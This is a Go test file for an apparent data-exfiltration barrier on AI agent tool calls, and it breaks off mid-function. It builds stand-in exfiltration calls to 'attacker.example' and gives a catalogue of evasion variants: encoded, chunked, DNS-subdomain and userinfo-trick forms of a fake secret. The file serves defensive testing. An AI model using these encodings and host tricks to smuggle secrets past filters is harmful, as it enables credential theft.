package taint

import (
	"bytes"
	"context"
	"crypto/ed25519"
	"encoding/base32"
	"encoding/base64"
	"encoding/hex"
	"encoding/json"
	"errors"
	"fmt"
	"hash/crc32"
	"net/url"
	"strings"
	"sync"
	"testing"

	"github.com/sharedcode/joltrin/v5/governance"
)

const (
	fixtureSecret = "jltn-unit-fixture-7f3a9c21d4e8b650" // fake, only used in tests
	fixturePII    = "casey.example.person@example.org"
)

const testPolicy = `{
  "version": 1,
  "labels": {
    "secret": {
      "allow_hosts": ["vault.internal.example", "*.trusted.example", "secure.example:8443"],
      "allow_paths": ["/var/run/agent/", "/etc/agent/token"],
      "allow_tools": ["local_hash"]
    },
    "pii": {"allow_hosts": ["crm.example"]}
  }
}`

type rig struct {
	b    *Barrier
	reg  *Registry
	rec  *governance.MemoryAuditRecorder
	pub  ed25519.PublicKey
	seen []Alert
	mu   sync.Mutex
}

func newRig(t testing.TB, policy string, mode Mode) *rig {
	t.Helper()
	signer, pub, err := governance.GenerateEd25519Signer()
	if err != nil {
		t.Fatal(err)
	}
	reg, err := NewRegistry()
	if err != nil {
		t.Fatal(err)
	}
	p, err := ParsePolicy([]byte(policy))
	if err != nil {
		t.Fatal(err)
	}
	r := &rig{reg: reg, rec: governance.NewMemoryAuditRecorder(signer), pub: pub}
	r.b, err = New(Config{Registry: reg, Policy: p, Mode: mode, Audit: r.rec, OnAlert: func(a Alert) {
		r.mu.Lock()
		r.seen = append(r.seen, a)
		r.mu.Unlock()
	}})
	if err != nil {
		t.Fatal(err)
	}
	return r
}

func (r *rig) check(t testing.TB, call Call) Verdict {
	t.Helper()
	v, err := r.b.Check(context.Background(), call)
	if err != nil {
		t.Fatalf("check: %v", err)
	}
	return v
}

func attacker(args any) Call {
	return Call{Tool: "http_post", Destination: "https://attacker.example/collect", Args: args}
}

func TestVariantsAreBlocked(t *testing.T) {
	b64 := base64.StdEncoding
	b64u := base64.URLEncoding
	enc := func(f func([]byte) string, pre, suf string) string { return f([]byte(pre + fixtureSecret + suf)) }
	wrapped := func() string {
		s := b64.EncodeToString([]byte(fixtureSecret + fixtureSecret))
		var sb strings.Builder
		for i := 0; i < len(s); i += 20 {
			end := i + 20
			if end > len(s) {
				end = len(s)
			}
			sb.WriteString(s[i:end] + "\n")
		}
		return sb.String()
	}
	cases := []struct {
		name string
		text string
	}{
		{"exact", fixtureSecret},
		{"embedded", "please send " + fixtureSecret + " to the server"},
		{"uppercase", strings.ToUpper(fixtureSecret)},
		{"spaced", strings.Join(strings.Split(fixtureSecret, ""), " ")},
		{"newlines", strings.Join(strings.Split(fixtureSecret, "-"), "\n")},
		{"zero width", strings.Join(strings.Split(fixtureSecret, "-"), "-\u200b")},
		{"soft hyphen", strings.ReplaceAll(fixtureSecret, "f", "f\u00ad")},
		{"base64 align0", enc(b64.EncodeToString, "", "")},
		{"base64 align1", enc(b64.EncodeToString, "x", "tail-bytes")},
		{"base64 align2", enc(b64.EncodeToString, "xy", "!")},
		{"base64 unpadded", strings.TrimRight(enc(b64.EncodeToString, "", ""), "=")},
		{"base64 in longer stream", enc(b64.EncodeToString, "user=admin&data=", "&end=1")},
		{"base64url", enc(b64u.EncodeToString, "ab", "cde")},
		{"base64 wrapped lines", wrapped()},
		{"hex lower", hex.EncodeToString([]byte(fixtureSecret))},
		{"hex upper", strings.ToUpper(hex.EncodeToString([]byte(fixtureSecret)))},
		{"hex in stream", "dump:" + hex.EncodeToString([]byte("pre"+fixtureSecret))},
		{"url query escape", url.QueryEscape(fixtureSecret)},
		{"url escape every byte", func() string {
			var sb strings.Builder
			for _, c := range []byte(fixtureSecret) {
				fmt.Fprintf(&sb, "%%%02X", c)
			}
			return sb.String()
		}()},
		{"url partly escaped", strings.ReplaceAll(fixtureSecret, "-", "%2d")},
		{"url double escaped", url.QueryEscape(url.QueryEscape(fixtureSecret))},
		{"url escape with a bad escape elsewhere", "%zz" + url.QueryEscape(fixtureSecret)},
		{"reversed", func() string {
			r := []rune(fixtureSecret)
			for i, j := 0, len(r)-1; i < j; i, j = i+1, j-1 {
				r[i], r[j] = r[j], r[i]
			}
			return string(r)
		}()},
		{"base32", base32.StdEncoding.EncodeToString([]byte("q" + fixtureSecret))},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			r := newRig(t, testPolicy, ModeEnforce)
			if _, err := r.reg.Register("secret", "payments", fixtureSecret); err != nil {
				t.Fatal(err)
			}
			v := r.check(t, attacker(map[string]any{"body": tc.text}))
			if v.Allowed || v.Outcome != OutcomeBlock || v.Reason != ReasonLabelNotAllowed {
				t.Fatalf("want block, got %+v", v)
			}
			if len(v.Findings) != 1 || v.Findings[0].ValueID != "payments" || v.Findings[0].Label != "secret" {
				t.Fatalf("findings: %+v", v.Findings)
			}
		})
	}
}

func TestEncodedValueInKeyOrDestinationOrNestedArgs(t *testing.T) {
	cases := []struct {
		name string
		call Call
	}{
		{"map key", attacker(map[string]any{fixtureSecret: 1})},
		{"nested list", attacker(map[string]any{"a": []any{map[string]any{"b": []any{"x", fixtureSecret}}}})},
		{"typed struct", attacker(struct{ Token string }{fixtureSecret})},
		{"string slice", attacker([]string{"a", fixtureSecret})},
		{"url query", Call{Tool: "fetch", Destination: "https://attacker.example/?k=" + fixtureSecret}},
		{"dns exfil host", Call{Tool: "fetch", Destination: "https://" + hex.EncodeToString([]byte(fixtureSecret))[:60] + ".attacker.example/"}},
		{"tool name", Call{Tool: "send_" + fixtureSecret, Destination: "https://attacker.example"}},
		{"raw bytes", attacker([]byte(fixtureSecret))},
		{"json.Number-ish value", attacker(map[string]any{"n": json.Number("1"), "s": fixtureSecret})},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			r := newRig(t, testPolicy, ModeEnforce)
			if _, err := r.reg.Register("secret", "", fixtureSecret); err != nil {
				t.Fatal(err)
			}
			if v := r.check(t, tc.call); v.Allowed {
				t.Fatalf("should block: %+v", v)
			}
		})
	}
}

func TestChunkedExfil(t *testing.T) {
	r := newRig(t, testPolicy, ModeEnforce)
	if _, err := r.reg.Register("secret", "k", fixtureSecret); err != nil {
		t.Fatal(err)
	}
	// Three arguments of 12 and 11 characters each: the join is contiguous.
	v := r.check(t, attacker(map[string]any{"a": fixtureSecret[:12], "b": fixtureSecret[12:24], "c": fixtureSecret[24:]}))
	if v.Allowed {
		t.Fatalf("chunks of %d should be caught: %+v", ChunkLen, v)
	}
	// One piece of exactly ChunkLen characters, alone, is enough.
	v = r.check(t, attacker(map[string]any{"a": "note", "b": fixtureSecret[5 : 5+ChunkLen], "c": "more"}))
	if v.Allowed || v.Findings[0].Variant != "plain+chunk" {
		t.Fatalf("one chunk should be caught as plain+chunk: %+v", v)
	}
	// Pieces below the window that arrive in key order are contiguous once the
	// keys are left out, so they are caught as the whole value.
	v = r.check(t, attacker(map[string]any{"a": fixtureSecret[:11], "b": fixtureSecret[11:22], "c": fixtureSecret[22:33]}))
	if v.Allowed {
		t.Fatalf("short pieces in key order should be caught: %+v", v)
	}
	// Pieces below the window, sent separately and out of order, are a known gap.
	v = r.check(t, attacker(map[string]any{"a": fixtureSecret[:11], "b": fixtureSecret[22:33], "c": fixtureSecret[11:22]}))
	if !v.Allowed {
		t.Fatalf("documented limit changed: pieces under %d characters out of order are not matched", ChunkLen)
	}
	// A value shorter than ChunkMinLen is matched whole only.
	r2 := newRig(t, testPolicy, ModeEnforce)
	short := "abcd-efgh-ijkl"
	if _, err := r2.reg.Register("secret", "", short); err != nil {
		t.Fatal(err)
	}
	if v := r2.check(t, attacker(map[string]any{"x": short[:10]})); !v.Allowed {
		t.Fatalf("a value under %d characters is not chunk-matched", ChunkMinLen)
	}
	if v := r2.check(t, attacker(map[string]any{"x": short})); v.Allowed {
		t.Fatal("whole short value should block")
	}
}

func TestSinkPolicy(t *testing.T) {
	cases := []struct {
		name  string
		label string
		call  Call
		allow bool
	}{
		{"allowed host", "secret", Call{Tool: "http_post", Destination: "https://vault.internal.example/v1/put"}, true},
		{"allowed host upper case and trailing dot", "secret", Call{Tool: "http_post", Destination: "https://VAULT.internal.example./x"}, true},
		{"allowed host any port", "secret", Call{Tool: "http_post", Destination: "https://vault.internal.example:9999/x"}, true},
		{"allowed bare host:port", "secret", Call{Tool: "t", Destination: "vault.internal.example:443"}, true},
		{"wildcard subdomain", "secret", Call{Tool: "t", Destination: "https://a.b.trusted.example/x"}, true},
		{"wildcard does not match bare domain", "secret", Call{Tool: "t", Destination: "https://trusted.example/x"}, false},
		{"wildcard does not match look-alike", "secret", Call{Tool: "t", Destination: "https://eviltrusted.example/x"}, false},
		{"suffix trick", "secret", Call{Tool: "t", Destination: "https://vault.internal.example.attacker.example/x"}, false},
		{"userinfo trick", "secret", Call{Tool: "t", Destination: "https://vault.internal.example@attacker.example/x"}, false},
		{"userinfo with colon trick", "secret", Call{Tool: "t", Destination: "https://vault.internal.example:pw@attacker.example/x"}, false},
		{"port-pinned entry right port", "secret", Call{Tool: "t", Destination: "https://secure.example:8443/x"}, true},
		{"port-pinned entry wrong port", "secret", Call{Tool: "t", Destination: "https://secure.example:9/x"}, false},
		{"other host", "secret", Call{Tool: "t", Destination: "https://attacker.example/x"}, false},
		{"host allowed for another label only", "secret", Call{Tool: "t", Destination: "https://crm.example/x"}, false},
		{"pii to its own host", "pii", Call{Tool: "t", Destination: "https://crm.example/x"}, true},
		{"allowed dir", "secret", Call{Tool: "write_file", Destination: "/var/run/agent/out.txt"}, true},
		{"allowed dir via file url", "secret", Call{Tool: "write_file", Destination: "file:///var/run/agent/out.txt"}, true},
		{"allowed exact file", "secret", Call{Tool: "write_file", Destination: "/etc/agent/token"}, true},
		{"sibling of exact file", "secret", Call{Tool: "write_file", Destination: "/etc/agent/token2"}, false},
		{"dot dot escape", "secret", Call{Tool: "write_file", Destination: "/var/run/agent/../../../tmp/x"}, false},
		{"dir name prefix", "secret", Call{Tool: "write_file", Destination: "/var/run/agentx/out"}, false},
		{"the dir itself is not a file under it", "secret", Call{Tool: "write_file", Destination: "/var/run/agent"}, false},
		{"relative path", "secret", Call{Tool: "write_file", Destination: "./out.txt"}, false},
		{"home path", "secret", Call{Tool: "write_file", Destination: "~/out.txt"}, false},
		{"allowed local tool with no destination", "secret", Call{Tool: "local_hash"}, true},
		{"other tool with no destination", "secret", Call{Tool: "send_email"}, false},
		{"allowed tool name does not excuse a bad destination", "secret", Call{Tool: "local_hash", Destination: "https://attacker.example"}, false},
		{"garbage destination", "secret", Call{Tool: "t", Destination: "https://"}, false},
		{"destination with space", "secret", Call{Tool: "t", Destination: "vault.internal.example evil"}, false},
		{"label with no policy entry", "customer-data", Call{Tool: "t", Destination: "https://vault.internal.example"}, false},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			r := newRig(t, testPolicy, ModeEnforce)
			if _, err := r.reg.Register(tc.label, "v", fixtureSecret); err != nil {
				t.Fatal(err)
			}
			tc.call.Args = map[string]any{"data": fixtureSecret}
			v := r.check(t, tc.call)
			if v.Allowed != tc.allow {
				t.Fatalf("allowed=%v want %v: %+v", v.Allowed, tc.allow, v)
			}
			if tc.allow && (v.Outcome != OutcomeAllow || v.Reason != ReasonSinkAllowed) {
				t.Fatalf("allowed call should say sink_allowed: %+v", v)
			}
		})
	}
}

func TestNoMatchIsAllowedAnywhere(t *testing.T) {
	r := newRig(t, testPolicy, ModeEnforce)
	if _, err := r.reg.Register("secret", "", fixtureSecret); err != nil {
		t.Fatal(err)
	}
	v := r.check(t, attacker(map[string]any{"q": "weather in Lisbon", "n": 3, "f": 1.5, "ok": true, "none": nil}))
	if !v.Allowed || v.Reason != ReasonNoMatch || len(v.Findings) != 0 {
		t.Fatalf("%+v", v)
	}
}

func TestMultipleLabelsAllMustBeAllowed(t *testing.T) {
	r := newRig(t, testPolicy, ModeEnforce)
	_, _ = r.reg.Register("secret", "s", fixtureSecret)
	_, _ = r.reg.Register("pii", "p", fixturePII)
	call := Call{Tool: "t", Destination: "https://vault.internal.example", Args: []string{fixtureSecret, fixturePII}}
	v := r.check(t, call)
	if v.Allowed || len(v.Findings) != 2 {
		t.Fatalf("pii is not allowed at the vault host: %+v", v)
	}
	var okSecret, okPII bool
	for _, f := range v.Findings {
		if f.Label == "secret" {
			okSecret = f.Allowed
		} else {
			okPII = f.Allowed
		}
	}
	if !okSecret || okPII {
		t.Fatalf("per-finding allowed flags wrong: %+v", v.Findings)
	}
}

func TestHoneytokens(t *testing.T) {
	for _, kind := range Kinds {
		t.Run(kind, func(t *testing.T) {
			r := newRig(t, testPolicy, ModeEnforce)
			tok, id, err := r.reg.PlantHoneytoken(kind, "")
			if err != nil {
				t.Fatal(err)
			}
			if k, ok := IsHoneytoken(tok); !ok || k != kind {
				t.Fatalf("marker check failed for %s", kind)
			}
			// Always blocked, even to a host the policy allows for every label.
			r.check(t, Call{Tool: "noop"})
			v := r.check(t, Call{Tool: "http_post", Destination: "https://vault.internal.example", Args: map[string]any{"x": "key is " + tok}})
			if v.Allowed || v.Outcome != OutcomeHoneytoken || v.Reason != ReasonHoneytoken {
				t.Fatalf("honeytoken must block: %+v", v)
			}
			if len(r.seen) != 1 || r.seen[0].ValueID != id || r.seen[0].EventHash != v.Receipt.Event.Hash {
				t.Fatalf("alert: %+v", r.seen)
			}
			ev := v.Receipt.Event
			if ev.Decision != governance.DecisionViolation || ev.Metadata["honeytoken"] != "true" {
				t.Fatalf("audit event: %+v", ev)
			}
			// Encoded copies trip too.
			v = r.check(t, attacker(map[string]any{"x": base64.StdEncoding.EncodeToString([]byte("a" + tok))}))
			if v.Allowed || v.Outcome != OutcomeHoneytoken {
				t.Fatalf("encoded honeytoken must block: %+v", v)
			}
		})
	}
}

func TestHoneytokenFormatAndMarker(t *testing.T) {
	a, _ := GenerateHoneytoken(KindAWSAccessKeyID)
	if len(a) != 20 || !strings.HasPrefix(a, "AKIA") {
		t.Fatalf("aws id shape: %q", a)
	}
	s, _ := GenerateHoneytoken(KindAWSSecretAccessKey)
	if len(s) != 40 {
		t.Fatalf("aws secret shape: %q", s)
	}
	g, _ := GenerateHoneytoken(KindGitHubToken)
	if len(g) != 40 || !strings.HasPrefix(g, "ghp_") {
		t.Fatalf("github shape: %q", g)
	}
	// The suffix is never the real CRC32 base62 of the body, so GitHub's own offline check rejects it.
	body, suffix := g[4:34], g[34:]
	v := crc32.ChecksumIEEE([]byte(body))
	real := make([]byte, 6)
	for i := 5; i >= 0; i-- {
		real[i] = alphaB62[v%62]
		v /= 62
	}
	if string(real) == suffix {
		t.Fatal("github honeytoken carries a valid checksum")
	}
	if _, ok := IsHoneytoken(a[:19] + "A"); ok && a[19] != 'A' {
		t.Fatal("a tampered token should lose the marker")
	}
	if _, ok := IsHoneytoken("AKIA" + "ABCDEFGHIJKLMNOP"); ok {
		t.Fatal("a random AKIA-shaped string should not carry the marker")
	}
	if _, err := GenerateHoneytoken("nope"); !errors.Is(err, ErrUnknownKind) {
		t.Fatal(err)
	}
	seen := map[string]bool{}
	for i := 0; i < 50; i++ {
		x, _ := GenerateHoneytoken(KindGenericAPIKey)
		if seen[x] {
			t.Fatal("repeat")
		}
		seen[x] = true
	}
}

func TestObserveMode(t *testing.T) {
	r := newRig(t, testPolicy, ModeObserve)
	_, _ = r.reg.Register("secret", "k", fixtureSecret)
	tok, _, _ := r.reg.PlantHoneytoken(KindAWSAccessKeyID, "decoy")

	v := r.check(t, attacker(map[string]any{"x": fixtureSecret}))
	if !v.Allowed || v.Outcome != OutcomeObserved || v.Reason != ReasonLabelNotAllowed {
		t.Fatalf("observe should allow and say it would have blocked: %+v", v)
	}
	if v.Receipt.Event.Decision != governance.DecisionAllow || v.Receipt.Event.Metadata["outcome"] != OutcomeObserved || v.Receipt.Event.Metadata["mode"] != "observe" {
		t.Fatalf("event: %+v", v.Receipt.Event)
	}
	v = r.check(t, attacker(map[string]any{"x": tok}))
	if !v.Allowed || v.Outcome != OutcomeObserved || v.Reason != ReasonHoneytoken || len(r.seen) != 1 {
		t.Fatalf("honeytoken in observe mode still alerts: %+v alerts=%d", v, len(r.seen))
	}
	if v.Receipt.Event.Decision != governance.DecisionViolation {
		t.Fatalf("a honeytoken trip is a violation even in observe mode: %+v", v.Receipt.Event)
	}
	if err := r.rec.VerifySignatures(r.pub); err != nil {
		t.Fatal(err)
	}
}

func TestPolicyModeIsUsedAndOverridden(t *testing.T) {
	p, err := ParsePolicy([]byte(`{"version":1,"mode":"observe","labels":{}}`))
	if err != nil {
		t.Fatal(err)
	}
	reg, _ := NewRegistry()
	b, _ := New(Config{Registry: reg, Policy: p})
	if b.Mode() != ModeObserve {
		t.Fatal(b.Mode())
	}
	b, _ = New(Config{Registry: reg, Policy: p, Mode: ModeEnforce})
	if b.Mode() != ModeEnforce {
		t.Fatal(b.Mode())
	}
	if _, err := New(Config{Registry: reg, Policy: p, Mode: "dry-run"}); err == nil {
		t.Fatal("bad mode accepted")
	}
	if _, err := New(Config{}); err == nil {
		t.Fatal("missing registry accepted")
	}
}

func TestShortAndBadValuesAreRefused(t *testing.T) {
	reg, _ := NewRegistry()
	cases := []struct {
		name, label, value string
		want               error
	}{
		{"empty", "secret", "", ErrValueTooShort},
		{"seven characters", "secret", "abcdefg", ErrValueTooShort},
		{"eight with spaces only counts letters", "secret", "ab cd ef g", ErrValueTooShort},
		{"zero width does not count", "secret", "abcd\u200befg\u200b", ErrValueTooShort},
		{"too long", "secret", strings.Repeat("x", MaxValueLen+1), ErrValueTooLong},
		{"bad label", "Secret!", "abcdefgh12345", ErrBadLabel},
		{"empty label", "", "abcdefgh12345", ErrBadLabel},
		{"eight is enough", "secret", "abcdefgh", nil},
		{"duplicate", "pii", "abcdefgh", ErrAlreadyRegistered},
		{"duplicate with other case and spacing", "pii", "ABCD EFGH", ErrAlreadyRegistered},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			_, err := reg.Register(tc.label, "", tc.value)
			if !errors.Is(err, tc.want) {
				t.Fatalf("got %v want %v", err, tc.want)
			}
			if err != nil && tc.value != "" && strings.Contains(err.Error(), tc.value) {
				t.Fatalf("error echoes the value: %v", err)
			}
		})
	}
}

func TestRegistryLimits(t *testing.T) {
	if _, err := NewRegistryWithKey([]byte("short")); err == nil {
		t.Fatal("short key accepted")
	}
	r := newRig(t, testPolicy, ModeEnforce)
	_, _ = r.reg.Register("secret", "same", fixtureSecret)
	id, err := r.reg.Register("secret", "same", "another-fixture-value-123")
	if err != nil || id == "same" {
		t.Fatalf("duplicate handle should be made unique: %q %v", id, err)
	}
}

func TestInspectionLimitsFailClosed(t *testing.T) {
	r := newRig(t, testPolicy, ModeEnforce)
	_, _ = r.reg.Register("secret", "", fixtureSecret)
	big := strings.Repeat("a", MaxArgBytes+1)
	v := r.check(t, attacker(map[string]any{"x": big}))
	if v.Allowed || v.Reason != ReasonNotInspectable {
		t.Fatalf("oversize call must block: %+v", v)
	}
	var deep any = "x"
	for i := 0; i < maxDepth+5; i++ {
		deep = []any{deep}
	}
	v = r.check(t, attacker(deep))
	if v.Allowed || v.Reason != ReasonNotInspectable {
		t.Fatalf("deep call must block: %+v", v)
	}
	v = r.check(t, attacker(make(chan int)))
	if v.Allowed || v.Reason != ReasonNotInspectable {
		t.Fatalf("unmarshalable call must block: %+v", v)
	}
	// In observe mode the same call is let through and recorded as observed.
	o := newRig(t, testPolicy, ModeObserve)
	v = o.check(t, attacker(map[string]any{"x": big}))
	if !v.Allowed || v.Outcome != OutcomeObserved {
		t.Fatalf("%+v", v)
	}
}

type failingSink struct{}

func (failingSink) Record(context.Context, *governance.AuditEvent) error {
	return errors.New("disk full")
}
func (failingSink) Flush(context.Context) error { return nil }
func (failingSink) Close() error                { return nil }

func TestAuditFailureBlocksInEnforce(t *testing.T) {
	reg, _ := NewRegistry()
	p, _ := ParsePolicy([]byte(testPolicy))
	for _, mode := range []Mode{ModeEnforce, ModeObserve} {
		b, _ := New(Config{Registry: reg, Policy: p, Mode: mode, Audit: failingSink{}})
		v, err := b.Check(context.Background(), Call{Tool: "t", Args: "harmless"})
		if err == nil {
			t.Fatal("audit failure should be reported")
		}
		if (mode == ModeEnforce) == v.Allowed {
			t.Fatalf("mode %s: allowed=%v", mode, v.Allowed)
		}
		if mode == ModeEnforce && v.Reason != ReasonAuditFailed {
			t.Fatalf("%+v", v)
		}
	}
}

func TestNoAuditSinkStillDecides(t *testing.T) {
	reg, _ := NewRegistry()
	_, _ = reg.Register("secret", "", fixtureSecret)
	p, _ := ParsePolicy([]byte(testPolicy))
	b, _ := New(Config{Registry: reg, Policy: p})
	v, err := b.Check(context.Background(), attacker(fixtureSecret))
	if err != nil || v.Allowed || v.Receipt != nil {
		t.Fatalf("%+v %v", v, err)
	}
}

// secretForms lists every string the test knows the secret could appear as.
func secretForms(secret string) []string {
	b := []byte(secret)
	forms := []string{
		secret, strings.ToUpper(secret), hex.EncodeToString(b), strings.ToUpper(hex.EncodeToString(b)),
		url.QueryEscape(secret), base32.StdEncoding.EncodeToString(b),
	}
	for k := 0; k < 3; k++ {
		pre := bytes.Repeat([]byte("A"), k)
		full := append(append([]byte(nil), pre...), b...)
		s := base64.StdEncoding.EncodeToString(full)
		forms = append(forms, s, strings.TrimRight(s, "="), base64.URLEncoding.EncodeToString(full))
		// the middle of the stream, with the edge characters trimmed
		if len(s) > 12 {
			forms = append(forms, s[4:len(s)-4])
		}
	}
	return forms
}

func TestNoRawValueInOutputs(t *testing.T) {
	r := newRig(t, testPolicy, ModeEnforce)
	secrets := map[string]string{"secret": fixtureSecret, "pii": fixturePII}
	for label, v := range secrets {
		if _, err := r.reg.Register(label, label+"-handle", v); err != nil {
			t.Fatal(err)
		}
	}
	tok, _, _ := r.reg.PlantHoneytoken(KindAWSAccessKeyID, "decoy")
	secrets["honey"] = tok

	var out strings.Builder
	record := func(v Verdict, err error) {
		j, _ := json.Marshal(v)
		out.Write(j)
		out.WriteString(fmt.Sprintf("%+v|%v|%#v", v, err, v))
	}
	for _, v := range secrets {
		for _, form := range secretForms(v) {
			record(r.b.Check(context.Background(), attacker(map[string]any{"body": "x " + form + " y"})))
		}
	}
	// The secret in places that end up in the log: tool name, host, path, actor.
	record(r.b.Check(context.Background(), Call{Tool: "send_" + fixtureSecret, Destination: "https://attacker.example/", Args: fixtureSecret}))
	record(r.b.Check(context.Background(), Call{Tool: "fetch", Destination: "https://" + strings.ToLower(tok) + ".attacker.example/" + fixtureSecret}))
	record(r.b.Check(context.Background(), Call{Tool: "fetch", Destination: "/tmp/" + fixtureSecret, Args: fixtureSecret, Actor: "agent-" + fixtureSecret}))
	record(r.b.Check(context.Background(), Call{Tool: "fetch", Destination: "https://attacker.example/", Args: fixturePII}))
	for _, v := range secrets {
		_, err := r.reg.Register("secret", "", v)
		out.WriteString(fmt.Sprint(err))
	}
	_, err := r.reg.Register("secret", "", "short")
	out.WriteString(fmt.Sprint(err))
	for _, a := range r.seen {
		j, _ := json.Marshal(a)
		out.Write(j)
		out.WriteString(fmt.Sprintf("%+v", a))
	}
	var export bytes.Buffer
	if err := r.rec.ExportJSON(&export); err != nil {
		t.Fatal(err)
	}
	out.Write(export.Bytes())
	for _, ev := range r.rec.Query(governance.AuditFilter{}) {
		out.WriteString(fmt.Sprintf("%+v", *ev))
	}

	text := out.String()
	if len(r.rec.Query(governance.AuditFilter{})) < 20 {
		t.Fatal("expected many audit events")
	}
	for name, v := range secrets {
		for _, form := range secretForms(v) {
			if len(form) < 12 {
				continue
			}
			if strings.Contains(text, form) || strings.Contains(strings.ToLower(text), strings.ToLower(form)) {
				t.Fatalf("output contains %s in the form %q", name, form[:4]+"...")
			}
		}
		// no 12 character piece of the value either
		for i := 0; i+12 <= len(v); i++ {
			if strings.Contains(strings.ToLower(text), strings.ToLower(v[i:i+12])) {
				t.Fatalf("output contains a piece of %s", name)
			}
		}
	}
	if !strings.Contains(text, tainted) {
		t.Fatal("expected the tainted placeholder where the secret was in a tool name or host")
	}
	if err := r.rec.VerifySignatures(r.pub); err != nil {
		t.Fatal(err)
	}
}

func TestAuditChainAndReceiptsVerifyOffline(t *testing.T) {
	r := newRig(t, testPolicy, ModeEnforce)
	_, _ = r.reg.Register("secret", "k", fixtureSecret)
	var receipts []*Receipt
	for i := 0; i < 5; i++ {
		var v Verdict
		if i%2 == 0 {
			v = r.check(t, attacker(fixtureSecret))
		} else {
			v = r.check(t, Call{Tool: "t", Destination: "https://vault.internal.example", Args: fixtureSecret})
		}
		if v.Receipt == nil {
			t.Fatal("no receipt")
		}
		if err := VerifyReceipt(r.pub, *v.Receipt); err != nil {
			t.Fatal(err)
		}
		receipts = append(receipts, v.Receipt)
	}
	if receipts[1].Event.PrevHash != receipts[0].Event.Hash {
		t.Fatal("receipts are not chained")
	}
	if r.rec.Count() != 5 {
		t.Fatalf("count %d", r.rec.Count())
	}
	var export bytes.Buffer
	_ = r.rec.ExportJSON(&export)
	if err := VerifyExport(bytes.NewReader(export.Bytes()), r.pub); err != nil {
		t.Fatal(err)
	}

	// Wrong key.
	otherPub, _, _ := ed25519.GenerateKey(nil)
	if err := VerifyExport(bytes.NewReader(export.Bytes()), otherPub); err == nil {
		t.Fatal("wrong key verified")
	}
	if err := VerifyExport(bytes.NewReader(export.Bytes()), nil); err == nil {
		t.Fatal("missing key verified")
	}

	// A tampered receipt.
	bad := *receipts[0]
	bad.Event.Decision = governance.DecisionAllow
	if err := VerifyReceipt(r.pub, bad); !errors.Is(err, ErrBadReceipt) {
		t.Fatalf("tampered decision: %v", err)
	}
	bad = *receipts[0]
	bad.Event.Metadata = map[string]string{"sink": "host:vault.internal.example"}
	if err := VerifyReceipt(r.pub, bad); !errors.Is(err, ErrBadReceipt) {
		t.Fatalf("tampered metadata: %v", err)
	}
	bad = *receipts[0]
	bad.Event.Signature = nil
	if err := VerifyReceipt(r.pub, bad); !errors.Is(err, ErrBadReceipt) {
		t.Fatalf("stripped signature: %v", err)
	}

	// Tampered, dropped and reordered events in an export.
	var events []governance.AuditEvent
	_ = json.Unmarshal(export.Bytes(), &events)
	mutate := map[string]func([]governance.AuditEvent) []governance.AuditEvent{
		"edit reason": func(e []governance.AuditEvent) []governance.AuditEvent { e[2].Reason = "sink_allowed"; return e },
		"drop middle": func(e []governance.AuditEvent) []governance.AuditEvent { return append(e[:2], e[3:]...) },
		"swap":        func(e []governance.AuditEvent) []governance.AuditEvent { e[1], e[2] = e[2], e[1]; return e },
		"rehash edit": func(e []governance.AuditEvent) []governance.AuditEvent {
			e[0].Reason = ReasonNoMatch
			e[0].Hash = e[0].ComputeHash(e[0].PrevHash)
			return e
		},
	}
	for name, f := range mutate {
		cp := make([]governance.AuditEvent, len(events))
		copy(cp, events)
		j, _ := json.Marshal(f(cp))
		if err := VerifyExport(bytes.NewReader(j), r.pub); err == nil {
			t.Fatalf("%s: tampered export verified", name)
		}
	}
	if err := VerifyExport(strings.NewReader("not json"), r.pub); err == nil {
		t.Fatal("garbage verified")
	}

	// In-memory chain tamper.
	r.rec.Query(governance.AuditFilter{})[0].Reason = ReasonNoMatch
	if err := r.rec.VerifyIntegrity(); !errors.Is(err, governance.ErrTamperedAuditChain) {
		t.Fatalf("in-memory tamper: %v", err)
	}
	if err := r.rec.VerifySignatures(r.pub); err == nil {
		t.Fatal("signatures verified a tampered chain")
	}
}

func TestAuditPIIMasking(t *testing.T) {
	r := newRig(t, testPolicy, ModeEnforce)
	_, _ = r.reg.Register("secret", "k", fixtureSecret)
	v := r.check(t, Call{Tool: "mail_casey@example.org", Destination: "https://203.0.113.9/x", Args: fixtureSecret, Actor: "ops@example.org"})
	ev := v.Receipt.Event
	// ActorID is an identity field and is not masked, as in governance.PIIRedactor.
	all := ev.Resource + ev.Metadata["tool"] + ev.Metadata["sink"]
	if strings.Contains(all, "@example.org") || strings.Contains(all, "203.0.113.9") {
		t.Fatalf("PII not masked in audit event: %+v", ev)
	}
	if err := VerifyReceipt(r.pub, *v.Receipt); err != nil {
		t.Fatalf("receipt must verify over the masked text: %v", err)
	}
	if err := r.rec.VerifySignatures(r.pub); err != nil {
		t.Fatal(err)
	}
}

func TestConcurrency(t *testing.T) {
	r := newRig(t, testPolicy, ModeEnforce)
	for i := 0; i < 10; i++ {
		_, _ = r.reg.Register("secret", fmt.Sprintf("seed%d", i), fmt.Sprintf("seed-secret-value-%04d-abcdef", i))
	}
	const workers, per = 16, 40
	var wg sync.WaitGroup
	var mu sync.Mutex
	blocked, allowed := 0, 0
	for w := 0; w < workers; w++ {
		wg.Add(1)
		go func(w int) {
			defer wg.Done()
			own := fmt.Sprintf("worker-%02d-private-value-xyz", w)
			if _, err := r.reg.Register("secret", "", own); err != nil {
				t.Error(err)
				return
			}
			for i := 0; i < per; i++ {
				var c Call
				switch i % 3 {
				case 0:
					c = attacker(base64.StdEncoding.EncodeToString([]byte("p" + own)))
				case 1:
					c = Call{Tool: "t", Destination: "https://vault.internal.example", Args: own}
				default:
					c = attacker("nothing to see")
				}
				v, err := r.b.Check(context.Background(), c)
				if err != nil {
					t.Error(err)
					return
				}
				mu.Lock()
				if v.Allowed {
					allowed++
				} else {
					blocked++
				}
				mu.Unlock()
			}
		}(w)
	}
	wg.Wait()
	if blocked+allowed != workers*per || r.rec.Count() != workers*per {
		t.Fatalf("blocked=%d allowed=%d events=%d", blocked, allowed, r.rec.Count())
	}
	wantBlocked := workers * ((per + 2) / 3)
	if blocked != wantBlocked {
		t.Fatalf("blocked %d want %d", blocked, wantBlocked)
	}
	if err := r.rec.VerifySignatures(r.pub); err != nil {
		t.Fatal(err)
	}
}

func TestNoFalsePositivesOnOrdinaryText(t *testing.T) {
	r := newRig(t, testPolicy, ModeEnforce)
	for i := 0; i < 200; i++ {
